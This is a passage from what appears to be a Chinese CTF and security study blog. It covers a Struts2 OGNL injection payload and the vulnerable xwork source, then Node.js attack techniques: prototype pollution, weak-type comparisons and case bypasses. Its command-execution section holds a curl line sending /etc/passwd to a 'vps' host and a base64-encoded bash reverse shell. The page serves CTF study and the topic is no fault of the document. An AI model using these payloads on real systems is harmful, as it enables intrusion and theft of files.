punctuation">(</span><span class="token string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span>#e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>#f<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体的思路：</p><p>通过Java执行系统命令，与cmd中或者终端上一样执行shell命令，最典型的用法就是使用Runtime.getRuntime().exec(command)或者new ProcessBuilder(cmdArray).start()。从JDK1.5开始，官方提供并推荐使用ProcessBuilder类进行shell命令操作。</p><p>但是命令执行的结果需要用到字符串io处理，才能输出</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestOGNL</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ProcessBuilder</span> dir <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Process</span> sta <span class="token operator">=</span> dir<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> sta<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStreamReader</span> inputStreamReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> bufferedReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>inputStreamReader<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">50000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        bufferedReader<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以锁定到最终变量值发生变化的区域是在<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class:30 line</code>中</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">translateVariables</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token keyword">open</span><span class="token punctuation">,</span> <span class="token class-name">String</span> expression<span class="token punctuation">,</span> <span class="token class-name">ValueStack</span> stack<span class="token punctuation">,</span> <span class="token class-name">Class</span> asType<span class="token punctuation">,</span> <span class="token class-name">TextParseUtil<span class="token punctuation">.</span>ParsedValueEvaluator</span> evaluator<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Object</span> result <span class="token operator">=</span> expression<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token keyword">open</span> <span class="token operator">+</span> <span class="token string">"&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">//检查&#123;&#125;数量是否匹配</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> length <span class="token operator">&amp;&amp;</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">char</span> c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>x<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">'&#123;'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token operator">++</span>count<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">'&#125;'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token operator">--</span>count<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//检查是否合规</span>        <span class="token keyword">int</span> end <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> end <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">XWorkConverter</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">convertValue</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> result<span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token class-name">String</span> <span class="token keyword">var</span> <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//进入进行OGDL的解析</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">findValue</span><span class="token punctuation">(</span><span class="token keyword">var</span><span class="token punctuation">,</span> asType<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>evaluator <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            o <span class="token operator">=</span> evaluator<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> left <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> right <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> left <span class="token operator">+</span> o<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> o<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">stringSet</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                result <span class="token operator">=</span> result <span class="token operator">+</span> right<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            expression <span class="token operator">=</span> left <span class="token operator">+</span> o <span class="token operator">+</span> right<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            result <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>            expression <span class="token operator">=</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs安全</title>
      <link href="/2022/09/07/nodejs-an-quan/"/>
      <url>/2022/09/07/nodejs-an-quan/</url>
      
        <content type="html"><![CDATA[<h2 id="nodejs安全总结"><a href="#nodejs安全总结" class="headerlink" title="nodejs安全总结"></a>nodejs安全总结</h2><h2 id="nodejs数组传入"><a href="#nodejs数组传入" class="headerlink" title="nodejs数组传入"></a>nodejs数组传入</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// end过之后，不会立即停止，而是设置ended变量为false，然后继续执行，但是不能再次实行end函数</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析</strong> </p><p> <code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p>url编码后  “&#x3D;》%22与c结合会有2c，所以对c进行URL编码</p><p> <code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><h2 id="JS参数请求"><a href="#JS参数请求" class="headerlink" title="JS参数请求"></a>JS参数请求</h2><p>nodejs的 express框架 提供了四种方法来实现。</p><h3 id="1-req-body"><a href="#1-req-body" class="headerlink" title="1,req.body"></a>1,req.body</h3><p>解析body不是nodejs默认提供的，你需要载入body-parser中间件才可以使用req.body</p><p><code>Content-Type: application/json</code></p><p> <code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code> 直接以JSON的格式POST</p><p>此方法通常用来解析POST请求中的数据</p><h3 id="2-req-query"><a href="#2-req-query" class="headerlink" title="2,req.query"></a>2,req.query</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// GET /search?q=tobi+ferret</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q <span class="token comment">// => "tobi ferret"</span> <span class="token comment">// GET /shoes?order=desc&amp;shoe[color]=blue&amp;shoe[type]=converse</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>order <span class="token comment">// => "desc"</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>shoe<span class="token punctuation">.</span>color <span class="token comment">// => "blue"</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>shoe<span class="token punctuation">.</span>type <span class="token comment">// => "converse"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此方法多适用于GET请求，解析GET里的参数</p><h3 id="3-req-params"><a href="#3-req-params" class="headerlink" title="3,req.params"></a>3,req.params</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//例如，如果你有route/user/：name，那么“name”属性可作为req.params.name。</span>该对象默认为<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>。nodejs默认提供，无需载入其他中间件举例说明 <span class="token comment">// GET /user/tj</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>name <span class="token comment">// => "tj"</span>多适用于restful风格url中的参数的解析req<span class="token punctuation">.</span>query与req<span class="token punctuation">.</span>params的区别req<span class="token punctuation">.</span>params包含路由参数（在<span class="token constant">URL</span>的路径部分），而req<span class="token punctuation">.</span>query包含<span class="token constant">URL</span>的查询参数（在<span class="token constant">URL</span>的？后的参数）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4,req.param()弃用</p><h2 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h2><h3 id="大小写比较"><a href="#大小写比较" class="headerlink" title="大小写比较"></a>大小写比较</h3><p>跟php比较相似</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">></span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token operator">></span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"ad"</span><span class="token operator">></span><span class="token string">"v"</span><span class="token punctuation">)</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'asd'</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>总结</strong>：数字与<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>比较时：会优先将纯数字型字符串转为数字之后再进行比较；</p><p>字符串与字符串比较时：会将字符串的第一个字符转为ASCII码之后再进行比较；</p><p>而非数字型字符串与任何数字进行比较都是false。</p><p><strong>数组的比较：</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>总结：</strong>空数组之间比较永远为false，</p><p>数组与非数值型字符串比较，数组永远小于非数值型字符串；</p><p>数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较。</p><p>还有一些比较特别的相等比较：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">==</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// 输出：true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token operator">===</span><span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token comment">// 输出：false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">==</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// 输出：false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token operator">===</span><span class="token number">NaN</span><span class="token punctuation">)</span>  <span class="token comment">// 输出：false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="js大小写绕过"><a href="#js大小写绕过" class="headerlink" title="js大小写绕过"></a>js大小写绕过</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a><a href="https://so.csdn.net/so/search?q=ES6&spm=1001.2101.3001.7020">ES6</a>模板字符串</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//我们可以使用反引号替代括号执行函数，如:</span>alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">test!!</span><span class="token template-punctuation string">`</span></span><span class="token comment">//可以用反引号替代单引号双引号，可以在反引号内插入变量，如：</span><span class="token keyword">var</span> fruit <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">apple</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span>log<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">i like </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>fruit<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> very much</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span><span class="token comment">//事实上，模板字符串是将我们的字符串作为参数传入函数中，而该参数是一个数组，该数组会在遇到$&#123;&#125;时将字符串进行分割，具体为下：</span><span class="token punctuation">[</span><span class="token string">"i like "</span><span class="token punctuation">,</span> <span class="token string">" very much"</span><span class="token punctuation">,</span> <span class="token literal-property property">raw</span><span class="token operator">:</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token number">0</span><span class="token operator">:</span> <span class="token string">"i like "</span><span class="token number">1</span><span class="token operator">:</span> <span class="token string">" very much"</span><span class="token literal-property property">length</span><span class="token operator">:</span> <span class="token number">2</span><span class="token literal-property property">raw</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token string">"i like "</span><span class="token punctuation">,</span> <span class="token string">" very much"</span><span class="token punctuation">]</span><span class="token literal-property property">__proto__</span><span class="token operator">:</span> <span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//所以有时使用反引号执行会失败，所以如下是无法执行的：</span>eval<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert(2)</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p><p>在Node.js中的<strong>chile_process.exec调用的是&#x2F;bash.sh</strong>，它是一个bash解释器，可以执行系统命令在eval函数的参数中可以构造require(‘child_process’).exec(‘’);来进行调用。<strong>开一个子进程执行指定命令</strong></p><p>例如，</p><p>通过查找所有可替换用法 execSync spawnSync</p><p> <img src="https://img-blog.csdnimg.cn/128a8a59555a4938a35dd05c09984d0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="img"> </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//弹计算器:</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//读取文件</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'curl -F "x=`cat /etc/passwd`" http://vps'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>这个是将执行的命令，curl到自己的服务器上，显示出来。<span class="token comment">//反弹shell</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'echo YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx|base64 -d|bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjcuMC4wLjEvMzMzMyAwPiYx是</span><span class="token comment">//bash -i >&amp; /dev/tcp/127.0.0.1/3333 0>&amp;1 BASE64(还可以使用其他的反弹shell)</span><span class="token comment">//加密后的结果，直接调用会报错。</span><span class="token comment">//注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</span><span class="token comment">//execSync和exec一样的，应该只是版本不同，就相当于readfile和readfileSync是相同的</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat fl00g.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//还可以利用spawnSync,跟exec一样的，都用于开一个子进程执行指定命令。</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'./'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'fl00g.txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//如果require被禁用了，也可以利用这个来引入模块</span>global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token 